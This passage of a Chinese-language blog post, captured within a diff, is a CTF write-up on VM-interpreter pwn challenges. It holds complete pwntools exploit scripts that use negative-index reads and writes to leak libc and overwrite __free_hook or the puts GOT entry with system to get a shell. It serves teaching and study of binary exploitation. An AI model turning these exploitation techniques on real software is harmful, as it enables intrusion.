class="hljs-number">1</span>])<br>    <span class="hljs-keyword">return</span> opcode<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">writen</span>(<span class="hljs-params">v4,v2</span>):<br>    opcode = u32((p8(<span class="hljs-number">0x40</span>)+p8(v4)+p8(<span class="hljs-number">0</span>)+p8(v2))[::-<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">return</span> opcode<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">setnum</span>(<span class="hljs-params">v4,v2</span>):<br>    opcode = u32((p8(<span class="hljs-number">0x10</span>)+p8(v4)+p8(<span class="hljs-number">0</span>)+p8(v2))[::-<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">return</span> opcode<br><br><br><span class="hljs-comment">#n=(0x202060-0x201f80)/4 = 56</span><br><span class="hljs-comment">#-56 = 0xffffffc8</span><br><span class="hljs-comment">#-8</span><br><span class="hljs-comment">#stdin -&gt; __free_hook = 0x2398</span><br></code></pre></td></tr></table></figure>
+
+<p>因为只能4位一组，所以只能分别取到低四位和高四位</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">readn(<span class="hljs-number">4</span>,<span class="hljs-number">2</span>), <span class="hljs-comment">#reg[4] = memory[reg[2]] stdin+4</span><br>setnum(<span class="hljs-number">1</span>,<span class="hljs-number">0x10</span>),<br>lhl(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>), <span class="hljs-comment">#reg[1] = reg[1]&lt;&lt;reg[0] = 0x10 &lt;&lt; 8= 0x1000</span><br></code></pre></td></tr></table></figure>
+
+<p>这里用的是泄露stdin的libc地址，进而得到free_hook的地址</p>
+<p>因为最后向这里写数据</p>
+<p><img src="/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241212225519456-1239240624.png" srcset="/img/loading.gif" lazyload alt="img"> </p>
+<p>所以可以把这里存放着free_hook -8 的地址，那么就可以getshell</p>
+<p>那么整体思路就是通过构造负数下标，得到libc地址，然后构造高低位来泄露libc地址，然后根据偏移得到free_hook -8地址，然后继续通过高低位写入comment函数，获取shell</p>
+<h2 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gt <span class="hljs-keyword">import</span> *<br>con(<span class="hljs-string">&quot;amd64&quot;</span>)<br><br>io = process(<span class="hljs-string">&quot;./OVM&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/su/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">v4,v3,v2</span>):<br>    opcode = u32((p8(<span class="hljs-number">0x70</span>)+p8(v4)+p8(v3)+p8(v2))[::-<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">return</span> opcode<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">xor</span>(<span class="hljs-params">v4,v3,v2</span>):<br>    opcode = u32((p8(<span class="hljs-number">0xb0</span>)+p8(v4)+p8(v3)+p8(v2))[::-<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">return</span> opcode<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rhl</span>(<span class="hljs-params">v4,v3,v2</span>):<br>    opcode = u32((p8(<span class="hljs-number">0xd0</span>)+p8(v4)+p8(v3)+p8(v2))[::-<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">return</span> opcode<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">lhl</span>(<span class="hljs-params">v4,v3,v2</span>):<br>    opcode = u32((p8(<span class="hljs-number">0xc0</span>)+p8(v4)+p8(v3)+p8(v2))[::-<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">return</span> opcode<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">readn</span>(<span class="hljs-params">v4,v2</span>):<br>    opcode = u32((p8(<span class="hljs-number">0x30</span>)+p8(v4)+p8(<span class="hljs-number">0</span>)+p8(v2))[::-<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">return</span> opcode<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">writen</span>(<span class="hljs-params">v4,v2</span>):<br>    opcode = u32((p8(<span class="hljs-number">0x40</span>)+p8(v4)+p8(<span class="hljs-number">0</span>)+p8(v2))[::-<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">return</span> opcode<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">setnum</span>(<span class="hljs-params">v4,v2</span>):<br>    opcode = u32((p8(<span class="hljs-number">0x10</span>)+p8(v4)+p8(<span class="hljs-number">0</span>)+p8(v2))[::-<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">return</span> opcode<br><br><span class="hljs-comment">#n=(0x202060-0x201f80)/4 = 56</span><br><span class="hljs-comment">#-56 = 0xffffffc8</span><br><span class="hljs-comment">#-8</span><br><span class="hljs-comment">#stdin -&gt; __free_hook = 0x2398</span><br>code =[<br>    setnum(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>),<span class="hljs-comment"># reg[0]=8</span><br>    setnum(<span class="hljs-number">1</span>,<span class="hljs-number">0xff</span>), <span class="hljs-comment">#reg[1]=0xff</span><br>    setnum(<span class="hljs-number">2</span>,<span class="hljs-number">0xff</span>), <span class="hljs-comment">#reg[2]=0xff</span><br>    lhl(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>), <span class="hljs-comment">#reg[2] = reg[2]&lt;&lt;reg[0] = 0xff &lt;&lt; 0x8 =0xff00</span><br>    add(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>), <span class="hljs-comment">#reg[2] = reg[2] + reg[1] = 0xff00 + 0xff = 0xffff</span><br>    lhl(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>), <span class="hljs-comment">#reg[2] = reg[2]&lt;&lt;reg[0] = 0xffff &lt;&lt; 0x8 = 0xffff00</span><br>    add(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>), <span class="hljs-comment">#reg[2] = reg[2] + reg[1] = 0xffff00 + 0xff = 0xffffff</span><br>    lhl(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>), <span class="hljs-comment">#reg[2] = reg[2]&lt;&lt;reg[0] = 0xffffff &lt;&lt; 0x8 = 0xffffff00</span><br>    setnum(<span class="hljs-number">1</span>,<span class="hljs-number">0xc8</span>), <span class="hljs-comment">#reg[3] = 0xc8</span><br>    add(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>), <span class="hljs-comment">#reg[2] = reg[2] = reg[2]+reg[1] = 0xffffff00 + 0xc8 = 0xffffffc8 = -56</span><br>    readn(<span class="hljs-number">3</span>,<span class="hljs-number">2</span>), <span class="hljs-comment">#reg[3] = memory[reg[2]] stdin</span><br>    setnum(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>), <span class="hljs-comment">#reg[1] = 1</span><br>    add(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>), <span class="hljs-comment">#reg[2] = reg[2] + reg[1] = -55</span><br>    readn(<span class="hljs-number">4</span>,<span class="hljs-number">2</span>), <span class="hljs-comment">#reg[4] = memory[reg[2]] stdin+4</span><br>    setnum(<span class="hljs-number">1</span>,<span class="hljs-number">0x10</span>),<br>    lhl(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>), <span class="hljs-comment">#reg[1] = reg[1]&lt;&lt;reg[0] = 0x10 &lt;&lt; 8= 0x1000</span><br>    setnum(<span class="hljs-number">5</span>,<span class="hljs-number">0x90</span>),<br>    setnum(<span class="hljs-number">6</span>,<span class="hljs-number">0x3</span>),<br>    add(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-comment">#reg[1] = reg[1] + reg[1] = 0x1000 + 0x1000 = 0x2000</span><br>    lhl(<span class="hljs-number">6</span>,<span class="hljs-number">6</span>,<span class="hljs-number">0</span>), <span class="hljs-comment">#reg[6] = reg[6]&lt;&lt;reg[0] = 0x3&lt;&lt;8 = 0x300</span><br>    add(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">6</span>), <span class="hljs-comment">#reg[1] = reg[1] + reg[6] = 0x2000+0x300= 0x2300</span><br>    add(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">5</span>), <span class="hljs-comment">#reg[1] = reg[1] + reg[5] = 0x2300 + 0x90 = 0x2390</span><br>    add(<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>), <span class="hljs-comment">#reg[3] = reg[3] + reg[1] = __free_hook-8</span><br>    setnum(<span class="hljs-number">5</span>,<span class="hljs-number">47</span>),<br>    add(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">5</span>), <span class="hljs-comment">#reg[2] = reg[2] + reg[5] = -55+47 = -8</span><br>    writen(<span class="hljs-number">3</span>,<span class="hljs-number">2</span>), <span class="hljs-comment">#memory[reg[2]] = reg[3] = memory[-8] = reg[3]</span><br>    setnum(<span class="hljs-number">5</span>,<span class="hljs-number">1</span>),<br>    add(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">5</span>), <span class="hljs-comment">#reg[2] = reg[2] + reg[1] = -8 +1 = -7</span><br>    writen(<span class="hljs-number">4</span>,<span class="hljs-number">2</span>) <span class="hljs-comment">#memory[reg[2]] = reg[4] = memory[-7] = reg[4]  </span><br><br>]<br><br>io.recvuntil(<span class="hljs-string">&quot;PC: &quot;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0</span>))<br>io.recvuntil(<span class="hljs-string">&quot;SP: &quot;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>io.recvuntil(<span class="hljs-string">&quot;CODE SIZE: &quot;</span>)<br><br>io.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(code)))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> code:<br>   io.sendline(<span class="hljs-built_in">str</span>(i))<br><br><br>io.recvuntil(<span class="hljs-string">&quot;3: &quot;</span>)<br>last_4bytes = <span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">8</span>),<span class="hljs-number">16</span>)<br>suc(<span class="hljs-string">&quot;last_4bytes&quot;</span>,last_4bytes)<br>io.recvuntil(<span class="hljs-string">&quot;4: &quot;</span>)<br>high_4bytes = <span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">4</span>),<span class="hljs-number">16</span>)<br>suc(<span class="hljs-string">&quot;high_4bytes&quot;</span>,high_4bytes)<br><br>libc_base = ((high_4bytes &lt;&lt; <span class="hljs-number">32</span>) + last_4bytes) - libc.sym[<span class="hljs-string">&quot;__free_hook&quot;</span>] + <span class="hljs-number">8</span><br>suc(<span class="hljs-string">&quot;libc_base&quot;</span>,libc_base)<br>system = libc_base + libc.sym[<span class="hljs-string">&quot;system&quot;</span>]<br>io.recvuntil(<span class="hljs-string">&quot; OVM?\n&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> + p64(system)<br><span class="hljs-comment">#gdb.attach(io)</span><br>io.send(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="ciscn-2019-qual-virtual"><a href="#ciscn-2019-qual-virtual" class="headerlink" title="ciscn_2019_qual_virtual"></a>ciscn_2019_qual_virtual</h2><p>保护策略</p>
+<p><img src="/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241212230907806-826221916.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>ida逆向分析</p>
+<p><img src="/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241212230837520-618409823.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>这里仍然还是申请空间给stack，text，data等等</p>
+<p><img src="/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241212231207168-659364568.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>这里通过相关命令来转换对应字节</p>
+<p><img src="/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241212231657814-824395369.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>这里将对应的代码放入text段</p>
+<p>之后进入相应的功能</p>
+<p><img src="/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241212232226004-739893075.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>接受三个参数，a1为text段结构体的指针，a2为stack段结构体的指针，a3为data段结构体的指针</p>
+<p>这里看一下push函数</p>
+<p><img src="/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241213154412467-223727277.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>这里a1,a2就是原先的a3，a2</p>
+<p><img src="/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241213154536714-1643444929.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>8字节一组的opcode，倒着拿取</p>
+<p><img src="/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241213154646693-2054037180.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>那么push功能就是到data段上拿取一个值给v3然后将v3给stack</p>
+<p>pop即是和它相反的操作</p>
+<p>重点看看load和save</p>
+<p><img src="/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241213160329097-963325194.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>只接受一个参数也就是a3,data结构体，也就是说把data的东西加上v2偏移继续放入data，当然v2的值也是data里面取到的</p>
+<p><img src="/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241213160627536-2044709315.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>当然save就是相反的操作，将data里面值放入v3，而这里的v2依然可以控制</p>
+<p>这题没有开启got表全保护，那么可以修改puts的got表为system，那么在后面打印name的时候就会system(“&#x2F;bin&#x2F;sh”)获取shell</p>
+<p>控制v2的值实现负数索引，那么现在有个问题，因为stack指针存放在堆块里面，所以要想实现负数索引获取libc地址的话需要先把指针进行修改</p>
+<p><img src="/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241213161433224-83474805.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>这里取的地址是下图这个，还有一个要注意，就是存储stack是逆序存储的</p>
+<p><img src="/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241213162038357-1490745944.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>这里0xfffff….的值是-3，那么接下来的save就会取这两个值，而-3是下标就会把data指针修改成0x4040d0</p>
+<p>这里是把stack的两个值取到了data中，然后save修改data指针</p>
+<p><img src="/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241213163226582-874674569.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>这里取的是stderr和system的偏移</p>
+<p><img src="/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241213163821570-2125481947.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>stderr在新的指针下标是-1，那么取-1放入data，然后load进入data</p>
+<p><img src="/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241213164717866-432455765.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241213164536776-2043531085.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>继续取一个偏移</p>
+<p><img src="/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241213164659199-432134688.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>add放入data</p>
+<p><img src="/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241213164816886-1092033078.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>然后最后push进行到putsgot表的偏移，然后save即可修改puts 的got表</p>
+<p><img src="/2024/12/13/vmpwn%E5%B0%8F%E6%80%BB%E7%BB%93/3419447-20241213165010512-1055607648.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>最后即可getshell</p>
+<h2 id="EXP：-1"><a href="#EXP：-1" class="headerlink" title="EXP："></a>EXP：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gt <span class="hljs-keyword">import</span> *<br>con(<span class="hljs-string">&quot;amd64&quot;</span>)<br>libc= ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>io = process(<span class="hljs-string">&quot;./ciscn_2019_qual_virtual&quot;</span>)<br>io.recvuntil(<span class="hljs-string">&quot;name:&quot;</span>)<br><br>io.sendline(<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br><span class="hljs-comment"># gdb.attach(io)</span><br>io.recvuntil(<span class="hljs-string">&quot;instruction:&quot;</span>)    <br>offest = libc.sym[<span class="hljs-string">&quot;system&quot;</span>] - libc.sym[<span class="hljs-string">&quot;_IO_2_1_stderr_&quot;</span>]<br>payload = <span class="hljs-string">&#x27;push push save push load push add push save&#x27;</span><br>io.sendline(payload)<br><br>io.recvuntil(<span class="hljs-string">&quot;data:&quot;</span>)<br><br>data = [<span class="hljs-number">0x4040d0</span>,-<span class="hljs-number">3</span>,-<span class="hljs-number">1</span>,offest,-<span class="hljs-number">21</span>] <br>payload = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data:<br>    payload+= <span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&#x27; &#x27;</span><br>gdb.attach(io)<br>io.sendline(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>vmpwn的学习远远不止这些，这里只能算入门，大致了解一下vmpwn的分析方法和一些常见漏洞等等，对于这些偏逆向的题目需要有一定的逆向基础，对我而言还是比较吃力的，看懂要很久，但是我建议加上动态调试多去看看其中的变化，还是便于理解的…..vmpwn先搁了</p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/208450#h2-0">VM Pwn学习-安全客 - 安全资讯平台</a></p>
+<p><a target="_blank" rel="noopener" href="https://zikh26.github.io/posts/ccd7886.html#push%E5%87%BD%E6%95%B0">关于vm pwn的学习总结 | ZIKH26’s Blog</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/PWN/" class="print-no-link">#PWN</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>vmpwn小总结</div>
+      <div>https://ch13hh.github.io/2024/12/13/vmpwn小总结/</div>
+    </div>
+    <div class="license-meta">
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年12月13日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/12/13/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8BTcache-Stashing-Unlink-Attack/" title="常回家看看之Tcache_Stashing_Unlink_Attack">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">常回家看看之Tcache_Stashing_Unlink_Attack</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/11/01/2024%E5%BE%A1%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8APwn%E6%96%B9%E5%90%91%E9%A2%98%E8%A7%A3/" title="2024御网杯线上Pwn方向题解">
+                        <span class="hidden-mobile">2024御网杯线上Pwn方向题解</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"AWdKxtM41CcPxu2EZoBdWpas-gzGzoHsz","appKey":"idRJngxDPrsuLA4G1dKyEewP","path":"window.location.pathname","placeholder":"说点什么","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
